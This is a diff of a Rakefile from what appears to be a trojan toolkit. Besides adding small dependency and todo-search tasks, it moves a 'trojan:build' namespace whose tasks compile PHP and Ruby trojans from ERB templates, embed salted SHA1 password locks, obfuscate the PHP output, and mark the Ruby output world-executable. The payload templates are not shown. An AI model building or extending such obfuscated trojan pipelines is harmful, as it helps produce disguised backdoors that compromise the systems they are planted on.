@@ -19,78 +19,24 @@ require 'erb'
 include ERB::Util
 
 
-namespace :trojan do
+namespace :check do
+    desc "Checks system dependencies"
+    task :dependencies do
 
-    namespace :build do
+    end
 
-        desc "Compiles all of the trojans."
-        task :all do
-            Rake::Task['trojan:build:php'].execute
-            Rake::Task['trojan:build:ruby'].execute
-        end
-
-        desc "Compiles the trojan into a minified and obfuscated form."
-        task :php do
-            # notify the user
-            print 'Compiling PHP trojan....'
-
-            # calculate the password hash
-            locks[:one][:hash] = Digest::SHA1.hexdigest(locks[:one][:password] + locks[:one][:salt])
-
-            # compile the trojan's erb template
-            erb = ERB.new(File.read('./trojans/plaintext/trojan.php.erb'), 0, '<>', 'buffer')
-
-            # write the erb result to a temporary file
-            f = File.new('./trojans/plaintext/tmp.trojan.php', 'w')
-            f.write(erb.result(binding))
-            f.close
-
-            # process the temporary file with the PHP minifier and obfuscator
-            `php -f ./lib/build/obfuscate.php './trojans/plaintext/tmp.trojan.php' > ./trojans/obfuscated/o.php`
-
-            # delete the temporary file
-            File.delete('./trojans/plaintext/tmp.trojan.php')
-            
-            # complete
-            puts 'done.'
-        end
-
-        desc "Compiles the trojan into a minified and obfuscated form."
-        task :ruby do
-            # notify the user
-            print 'Compiling Ruby trojan...'
-
-            # calculate the password hash
-            locks[:two][:hash] = Digest::SHA1.hexdigest(locks[:two][:password] + locks[:two][:salt])
-
-            # compile the trojan's erb template
-            erb = ERB.new(File.read('./trojans/plaintext/trojan.rb.erb'), 0, '<>', 'buffer')
-
-            # write the erb result to a temporary file
-            #f = File.new('./trojans/plaintext/tmp.trojan.rb', 'w')
-            f = File.new('./trojans/obfuscated/o.rb', 'w')
-            f.write(erb.result(binding))
-            f.close
-
-            # set execute permissions on the trojan
-            File.chmod(0777, './trojans/obfuscated/o.rb')
-
-            # process the temporary file with the PHP minifier and obfuscator
-            #puts `php -f ./lib/build/obfuscate.php './trojans/plaintext/tmp.trojan.php' > ./trojans/obfuscated/o.php`
-
-            # delete the temporary file
-            #File.delete('./trojans/plaintext/tmp.trojan.php')
-            
-            # complete
-            puts 'done.'
-        end
+    desc "Searches for todos and such in the source"
+    task :todos do
+        puts `ack-grep --norake "@todo" .`
+        puts `ack-grep --norake "@bug" .`
+        puts `ack-grep --norake "@kludge" .`
+        puts `ack-grep --norake "@fixme" .`
     end
 end
 
 namespace :test do
-
     namespace :lint do
-        desc "Runs all source files through an appropriate linter."
+        desc "Runs all source files through an appropriate linter"
         task :all do
             Rake::Task['test:lint:js'].execute
             Rake::Task['test:lint:php'].execute
@@ -124,5 +70,72 @@ namespace :test do
 
     namespace :suite do
 
+    end
+end
+
+namespace :trojan do
+    namespace :build do
+
+        desc "Compiles all of the trojans"
+        task :all do
+            Rake::Task['trojan:build:php'].execute
+            Rake::Task['trojan:build:ruby'].execute
+        end
+
+        desc "Compiles the trojan into a minified and obfuscated form"
+        task :php do
+            # notify the user
+            print 'Compiling PHP trojan....'
+
+            # calculate the password hash
+            locks[:one][:hash] = Digest::SHA1.hexdigest(locks[:one][:password] + locks[:one][:salt])
+
+            # compile the trojan's erb template
+            erb = ERB.new(File.read('./trojans/plaintext/trojan.php.erb'), 0, '<>', 'buffer')
+
+            # write the erb result to a temporary file
+            f = File.new('./trojans/plaintext/tmp.trojan.php', 'w')
+            f.write(erb.result(binding))
+            f.close
+
+            # process the temporary file with the PHP minifier and obfuscator
+            `php -f ./lib/build/obfuscate.php './trojans/plaintext/tmp.trojan.php' > ./trojans/obfuscated/o.php`
+
+            # delete the temporary file
+            File.delete('./trojans/plaintext/tmp.trojan.php')
+            
+            # complete
+            puts 'done.'
+        end
+
+        desc "Compiles the trojan into a minified and obfuscated form"
+        task :ruby do
+            # notify the user
+            print 'Compiling Ruby trojan...'
+
+            # calculate the password hash
+            locks[:two][:hash] = Digest::SHA1.hexdigest(locks[:two][:password] + locks[:two][:salt])
+
+            # compile the trojan's erb template
+            erb = ERB.new(File.read('./trojans/plaintext/trojan.rb.erb'), 0, '<>', 'buffer')
+
+            # write the erb result to a temporary file
+            #f = File.new('./trojans/plaintext/tmp.trojan.rb', 'w')
+            f = File.new('./trojans/obfuscated/o.rb', 'w')
+            f.write(erb.result(binding))
+            f.close
+
+            # set execute permissions on the trojan
+            File.chmod(0777, './trojans/obfuscated/o.rb')
+
+            # process the temporary file with the PHP minifier and obfuscator
+            #puts `php -f ./lib/build/obfuscate.php './trojans/plaintext/tmp.trojan.php' > ./trojans/obfuscated/o.php`
+
+            # delete the temporary file
+            #File.delete('./trojans/plaintext/tmp.trojan.php')
+            
+            # complete
+            puts 'done.'
+        end
     end
 end
